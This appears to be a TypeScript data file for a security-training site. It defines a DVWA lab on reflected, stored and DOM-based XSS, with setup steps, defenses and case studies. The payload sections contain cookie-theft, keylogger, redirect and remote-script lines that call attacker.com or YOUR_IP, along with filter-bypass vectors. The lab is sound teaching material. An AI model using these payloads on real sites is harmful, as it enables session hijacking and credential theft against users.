    duration: 'Approximately 4 hours',
    difficulty: 'Advanced',
    tools: 'DVWA, Web Browser, Text Editor',
    description: 'Explore Cross-Site Scripting vulnerabilities using the Damn Vulnerable Web App (DVWA). This lab covers both reflected and stored XSS attacks with practical examples and mitigation strategies.',
    sections: [
      {
        id: 'overview',
        title: 'Overview',
        content: 'Cross-Site Scripting (XSS) is a common web application vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users. In this lab, we\'ll explore various XSS attack techniques.',
        subsections: [
          {
            title: 'What is Cross-Site Scripting (XSS)?',
            content: 'Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject client-side scripts into web pages viewed by other users. When successful, an XSS attack can allow the attacker to steal cookies, session tokens, or other sensitive information, redirect users to malicious websites, or perform actions on behalf of the victim.',
            warning: {
              type: 'warning',
              title: 'Legal Warning',
              content: 'Only perform XSS testing on systems you own or have explicit permission to test. Unauthorized testing is illegal and unethical.'
            }
          },
          {
            title: 'Types of XSS Attacks',
            content: 'There are several types of XSS attacks:',
            steps: [
              { title: 'Reflected XSS', content: 'Non-persistent attack where malicious script is reflected off a web server, such as in search results or error messages' },
              { title: 'Stored XSS', content: 'Persistent attack where malicious script is stored on the target server, such as in a database, message forum, or comment field' },
              { title: 'DOM-based XSS', content: 'Attack that occurs entirely in the browser when client-side JavaScript modifies the DOM in an unsafe way' }
            ]
          },
          {
            title: 'Learning Objectives',
            content: 'In this lab, you will:',
            steps: [
              { title: 'Set up DVWA', content: 'Install and configure the Damn Vulnerable Web Application' },
              { title: 'Execute Reflected XSS', content: 'Perform a reflected XSS attack' },
              { title: 'Execute Stored XSS', content: 'Perform a stored XSS attack' },
              { title: 'Understand Defense Mechanisms', content: 'Learn about XSS prevention techniques' }
            ]
          }
        ]
      },
      {
        id: 'dvwa-setup',
        title: 'Setting up DVWA',
        content: 'Before we can begin testing XSS vulnerabilities, we need to set up the Damn Vulnerable Web Application (DVWA).',
        subsections: [
          {
            title: 'What is DVWA?',
            content: 'Damn Vulnerable Web App (DVWA) is a PHP/MySQL web application that is intentionally vulnerable to various web attacks. It is designed for security professionals to test their skills and tools in a legal environment, and for web developers to better understand the processes of securing web applications.',
            warning: {
              type: 'info',
              title: 'Isolated Environment',
              content: 'DVWA should only be used in a lab environment. Never expose it to the internet or use it in a production environment.'
            }
          },
          {
            title: 'Installation Options',
            content: 'There are several ways to set up DVWA:',
            steps: [
              { title: 'Use a Pre-built VM', content: 'Download a security-focused distro like Kali Linux that includes DVWA' },
              { title: 'Docker Container', content: 'Pull and run the DVWA Docker image' },
              { title: 'Manual Installation', content: 'Download and install DVWA on a local web server' }
            ]
          },
          {
            title: 'Docker Installation (Recommended)',
            content: 'The easiest way to set up DVWA is using Docker:',
            steps: [
              { title: 'Install Docker', content: 'Download and install Docker from docker.com if you don\'t have it already' },
              { title: 'Pull DVWA Image', content: 'Run the command: docker pull vulnerables/web-dvwa', terminal: 'docker pull vulnerables/web-dvwa' },
              { title: 'Run DVWA Container', content: 'Start the container: docker run --rm -it -p 80:80 vulnerables/web-dvwa', terminal: 'docker run --rm -it -p 80:80 vulnerables/web-dvwa' },
              { title: 'Access DVWA', content: 'Open your browser and navigate to http://localhost' }
            ]
          },
          {
            title: 'Logging in to DVWA',
            content: 'Access the DVWA interface:',
            steps: [
              { title: 'Navigate to Login Page', content: 'Go to http://localhost (or the appropriate address)' },
              { title: 'Enter Credentials', content: 'Use the default credentials - Username: admin, Password: password' },
              { title: 'Setup / Reset DB', content: 'If this is your first time, you may need to click on "Create / Reset Database"' },
              { title: 'Set Security Level', content: 'Go to DVWA Security and set the security level to "Low" for initial testing' }
            ]
          }
        ]
      },
      {
        id: 'reflected-xss',
        title: 'Reflected XSS Attacks',
        content: 'Reflected XSS is the simplest form of XSS, where the malicious script is reflected off the web server, such as in search results or error messages.',
        subsections: [
          {
            title: 'Understanding Reflected XSS',
            content: 'In a reflected XSS attack:',
            steps: [
              { title: 'Attack Flow', content: 'The attacker crafts a malicious URL containing a script' },
              { title: 'User Interaction', content: 'The victim clicks on the link (often delivered via email or another website)' },
              { title: 'Server Response', content: 'The server includes the malicious script in its response' },
              { title: 'Script Execution', content: 'The victim\'s browser executes the script as if it came from the trusted site' }
            ]
          },
          {
            title: 'Executing a Basic Reflected XSS Attack',
            content: 'Let\'s perform a simple reflected XSS attack in DVWA:',
            steps: [
              { title: 'Navigate to XSS Reflected', content: 'Click on "XSS (Reflected)" in the DVWA menu' },
              { title: 'Enter Basic Script', content: 'In the "What\'s your name?" field, enter: <script>alert(\'XSS\')</script>' },
              { title: 'Submit the Form', content: 'Click the "Submit" button' },
              { title: 'Observe Alert', content: 'An alert box should appear, demonstrating that your script was executed' }
            ]
          },
          {
            title: 'Advanced Reflected XSS Payloads',
            content: 'Here are some more advanced XSS payloads to try:',
            code: `// Basic cookie theft
<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>

// Using HTML events instead of <script> tags
<img src="x" onerror="alert('XSS')">

// Bypassing simple filters
<scr<script>ipt>alert('XSS')</script>

// Using JavaScript URI
<a href="javascript:alert('XSS')">Click me</a>

// Using CSS injection
<div style="background-image: url('javascript:alert(\"XSS\")')">`,
            language: 'html'
          },
          {
            title: 'Creating Malicious URLs',
            content: 'A key aspect of reflected XSS is the ability to create malicious URLs:',
            steps: [
              { title: 'Identify Vulnerable Parameter', content: 'Find a parameter that reflects user input (like "name" in DVWA)' },
              { title: 'Craft Malicious URL', content: 'Create a URL with the XSS payload, e.g., http://localhost/vulnerabilities/xss_r/?name=<script>alert(\'XSS\')</script>' },
              { title: 'URL Encode if Necessary', content: 'Some characters may need to be URL encoded, e.g., < becomes %3C' },
              { title: 'Test the URL', content: 'Open the URL in your browser to verify it works' }
            ]
          }
        ]
      },
      {
        id: 'stored-xss',
        title: 'Stored XSS Attacks',
        content: 'Stored XSS (also known as persistent XSS) is more dangerous than reflected XSS as the malicious script is permanently stored on the target server.',
        subsections: [
          {
            title: 'Understanding Stored XSS',
            content: 'In a stored XSS attack:',
            steps: [
              { title: 'Attack Persistence', content: 'The malicious script is stored in a database, message forum, comment field, etc.' },
              { title: 'Automatic Execution', content: 'Any user who views the affected page will execute the script' },
              { title: 'No User Interaction', content: 'Unlike reflected XSS, no user interaction with a malicious link is required' },
              { title: 'Multiple Victims', content: 'The attack can affect multiple users who view the compromised page' }
            ]
          },
          {
            title: 'Executing a Basic Stored XSS Attack',
            content: 'Let\'s perform a simple stored XSS attack in DVWA:',
            steps: [
              { title: 'Navigate to XSS Stored', content: 'Click on "XSS (Stored)" in the DVWA menu' },
              { title: 'Enter Malicious Input', content: 'In the "Message" field, enter: <script>alert(\'Stored XSS\')</script>' },
              { title: 'Enter a Name', content: 'Fill in the "Name" field with any name' },
              { title: 'Submit the Form', content: 'Click the "Sign Guestbook" button' },
              { title: 'Observe Execution', content: 'An alert should appear immediately, and again whenever the page is reloaded' }
            ]
          },
          {
            title: 'Advanced Stored XSS Techniques',
            content: 'Here are some more advanced stored XSS techniques:',
            code: `// Keylogger XSS
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/log?key=' + e.key);
}
</script>

// Session hijacking
<script>
var img = new Image();
img.src = 'https://attacker.com/steal?cookie=' + document.cookie;
</script>

// Redirecting users
<script>
window.location = 'https://attacker.com/fake-login.html';
</script>

// Loading external JavaScript
<script src="https://attacker.com/malicious.js"></script>`,
            language: 'html'
          },
          {
            title: 'Impact of Stored XSS',
            content: 'Stored XSS attacks can have severe consequences:',
            steps: [
              { title: 'Cookie Theft', content: 'Attackers can steal session cookies, allowing them to impersonate users' },
              { title: 'Credential Harvesting', content: 'Attackers can create fake login forms to steal credentials' },
              { title: 'Malware Distribution', content: 'Attackers can redirect users to malicious sites that distribute malware' },
              { title: 'Website Defacement', content: 'Attackers can modify the appearance and content of websites' }
            ],
            warning: {
              type: 'danger',
              title: 'High Severity',
              content: 'Stored XSS vulnerabilities are considered high severity because they affect all users who view the compromised page and can lead to complete account takeover.'
            }
          }
        ]
      },
      {
        id: 'defense-mechanisms',
        title: 'XSS Defense Mechanisms',
        content: 'Understanding how to prevent XSS attacks is as important as knowing how to execute them.',
        subsections: [
          {
            title: 'Input Validation and Sanitization',
            content: 'The first line of defense against XSS is proper input handling:',
            steps: [
              { title: 'Whitelist Validation', content: 'Only accept known-good input instead of trying to block bad input' },
              { title: 'Sanitization', content: 'Remove or encode potentially dangerous characters and HTML' },
              { title: 'Type Checking', content: 'Ensure inputs are of the expected type (numbers, dates, etc.)' },
              { title: 'Library Usage', content: 'Use established libraries for input sanitization rather than writing your own' }
            ]
          },
          {
            title: 'Output Encoding',
            content: 'Properly encoding output prevents XSS by ensuring special characters are treated as data, not code:',
            code: `// HTML encoding in JavaScript
function htmlEncode(str) {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Using built-in functions in PHP
$safeOutput = htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// Using libraries in Node.js
const escapeHtml = require('escape-html');
const safeOutput = escapeHtml(userInput);`,
            language: 'javascript'
          },
          {
            title: 'Content Security Policy (CSP)',
            content: 'CSP is a powerful browser security feature that helps prevent XSS and other attacks:',
            steps: [
              { title: 'Define Trusted Sources', content: 'Specify which domains are allowed to load scripts, styles, etc.' },
              { title: 'Implement CSP Header', content: 'Add the Content-Security-Policy HTTP header to your responses' },
              { title: 'Example CSP', content: 'Content-Security-Policy: default-src \'self\'; script-src \'self\' trusted-scripts.com' },
              { title: 'Report-Only Mode', content: 'Use Content-Security-Policy-Report-Only to monitor violations without blocking content' }
            ]
          },
          {
            title: 'Additional Defense Measures',
            content: 'Several other techniques can help prevent XSS attacks:',
            steps: [
              { title: 'Use HttpOnly Cookies', content: 'Prevent JavaScript from accessing cookies with the HttpOnly flag' },
              { title: 'Implement X-XSS-Protection', content: 'Enable built-in XSS filters in browsers with this header' },
              { title: 'Use Modern Frameworks', content: 'Modern web frameworks often include built-in XSS protection' },
              { title: 'Regular Security Testing', content: 'Perform regular security assessments to identify and fix vulnerabilities' }
            ]
          },
          {
            title: 'Security in Different Contexts',
            content: 'Different contexts require different encoding strategies:',
            code: `// HTML context
<div id="output">Encode for HTML: &lt;script&gt;</div>

// JavaScript context
<script>
  var userInput = "Encode for JS: \\x3Cscript\\x3E";
</script>

// URL context
<a href="https://example.com?param=Encode%20for%20URL%3A%20%3Cscript%3E">Link</a>

// CSS context
<style>
  .user-class { content: "Encode for CSS: \\3C script\\3E "; }
</style>`,
            language: 'html'
          }
        ]
      },
      {
        id: 'practical-exercises',
        title: 'Practical XSS Exercises',
        content: 'Let\'s practice our XSS skills with some exercises in DVWA.',
        subsections: [
          {
            title: 'Exercise 1: Bypass XSS Filters',
            content: 'Try to bypass XSS filters at different security levels:',
            steps: [
              { title: 'Set Security Level to Medium', content: 'Change DVWA security level to "Medium" in the DVWA Security page' },
              { title: 'Test Basic Payload', content: 'Try the basic <script>alert(\'XSS\')</script> and observe that it\'s blocked' },
              { title: 'Try Alternative Vectors', content: 'Attempt other vectors like <img src="x" onerror="alert(\'XSS\')">' },
              { title: 'Document Your Findings', content: 'Record which payloads work and which are blocked' },
              { title: 'Repeat at High Level', content: 'Set security to "High" and repeat the process' }
            ]
          },
          {
            title: 'Exercise 2: Create a Cookie Stealer',
            content: 'Create a more advanced XSS payload to steal cookies:',
            steps: [
              { title: 'Set Up a Listening Server', content: 'If in a controlled environment, set up a server to receive stolen cookies' },
              { title: 'Create the Payload', content: 'Develop a payload that sends cookies to your server: <script>fetch(\'http://YOUR_IP/steal?cookie=\'+document.cookie)</script>' },
              { title: 'Test in DVWA', content: 'Insert the payload in both Reflected and Stored XSS pages' },
              { title: 'Check Server Logs', content: 'Verify if the cookie information appears in your server logs' }
            ],
            warning: {
              type: 'danger',
              title: 'Legal Warning',
              content: 'This exercise should ONLY be performed in a controlled lab environment with DVWA. Never attempt to steal cookies from real websites or users.'
            }
          },
          {
            title: 'Exercise 3: DOM-Based XSS',
            content: 'Explore DOM-based XSS vulnerabilities:',
            steps: [
              { title: 'Navigate to DOM XSS', content: 'Go to the "XSS (DOM)" page in DVWA' },
              { title: 'Examine the Source Code', content: 'View the page source to understand how user input is processed' },
              { title: 'Craft a Payload', content: 'Create a payload that exploits the DOM vulnerability: #<script>alert(\'DOM XSS\')</script>' },
              { title: 'Test Different Approaches', content: 'Try various payloads to see which ones execute successfully' }
            ]
          }
        ]
      },
      {
        id: 'real-world-implications',
        title: 'Real-World Implications and Case Studies',
        content: 'Understanding real-world XSS attacks helps appreciate their impact.',
        subsections: [
          {
            title: 'Notable XSS Incidents',
            content: 'Several major XSS vulnerabilities have affected popular websites:',
            steps: [
              { title: 'Twitter XSS Worm (2009)', content: 'The StalkDaily worm used XSS to spread automatically through Twitter profiles' },
              { title: 'Samy MySpace Worm (2005)', content: 'One of the first major XSS worms infected over one million MySpace profiles in 24 hours' },
              { title: 'Yahoo Mail XSS (2013)', content: 'A persistent XSS vulnerability in Yahoo Mail allowed attackers to steal cookies and emails' },
              { title: 'eBay XSS (2014, 2017)', content: 'Multiple XSS vulnerabilities allowed attackers to create fake login screens on eBay' }
            ]
          },
          {
            title: 'Business Impact of XSS',
            content: 'XSS vulnerabilities can have significant business consequences:',
            steps: [
              { title: 'Financial Loss', content: 'Direct losses from fraud, theft, and remediation costs' },
              { title: 'Reputation Damage', content: 'Loss of customer trust and negative publicity' },
              { title: 'Regulatory Penalties', content: 'Fines and sanctions for failing to protect user data' },
              { title: 'Operational Disruption', content: 'Service outages and emergency patching' }
            ]
          },
          {
            title: 'Responsible Disclosure',
            content: 'If you discover an XSS vulnerability in a real website, follow responsible disclosure practices:',
            steps: [
              { title: 'Do Not Exploit', content: 'Never exploit the vulnerability for personal gain or to cause harm' },
              { title: 'Report Privately', content: 'Contact the organization\'s security team directly, not on public forums' },
              { title: 'Provide Details', content: 'Clearly document the vulnerability with steps to reproduce' },
              { title: 'Allow Time to Fix', content: 'Give the organization reasonable time to address the issue before public disclosure' }
            ],
            warning: {
              type: 'info',
              title: 'Bug Bounty Programs',
              content: 'Many organizations have bug bounty programs that reward security researchers for responsibly disclosing vulnerabilities. Always check if such a program exists before reporting.'
            }
          }
        ]
      }
    ]
  }
];

export const getLabById = (id: string): Lab | undefined => {
  return labs.find(lab => lab.id === id);
};

export const getNextLab = (currentId: string): Lab | undefined => {
  const currentIndex = labs.findIndex(lab => lab.id === currentId);
  if (currentIndex === -1 || currentIndex === labs.length - 1) return undefined;
  return labs[currentIndex + 1];
};

export const getPreviousLab = (currentId: string): Lab | undefined => {
  const currentIndex = labs.findIndex(lab => lab.id === currentId);
  if (currentIndex <= 0) return undefined;
  return labs[currentIndex - 1];
};
